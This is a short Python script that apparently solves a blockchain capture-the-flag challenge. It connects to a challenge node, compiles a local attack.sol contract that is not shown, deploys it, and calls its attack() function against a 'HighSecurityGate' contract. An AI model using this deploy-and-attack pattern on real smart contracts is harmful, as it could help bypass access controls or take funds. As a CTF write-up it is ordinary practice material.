#!/usr/bin/env python3
from web3 import Web3
from solcx import compile_source
import time
node_url = "http://144.126.196.198:30123"

web3 = Web3(Web3.HTTPProvider(node_url))

# Verify connectivity
if web3.is_connected():
    print("Connection Successful")
else:
    print("Connection Failure")
    exit()

# There are two accounts in this challenge, but both work
web3.eth.default_account = web3.eth.accounts[0]

with open('./attack.sol', 'r') as file:
    source = file.read()

compiled = compile_source(source, output_values=['abi', 'bin'])

# The imported interface Entrant and contract HighSecurityGate are compiled first
# We don't need this, so I pop them off
# There's probably a cleaner way, but I don't want to read more docs
compiled.popitem()
compiled.popitem()

# Everything else is basically copy/pasted from the web3py
# compile/deploy example

contract_id, contract_interface = compiled.popitem()
bytecode = contract_interface['bin']
abi = contract_interface['abi']

Greeter = web3.eth.contract(abi=abi, bytecode=bytecode)
tx_hash = Greeter.constructor().transact()
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

greeter = web3.eth.contract(
        address = tx_receipt.contractAddress,
        abi = abi
        )

greeter.functions.attack().transact()
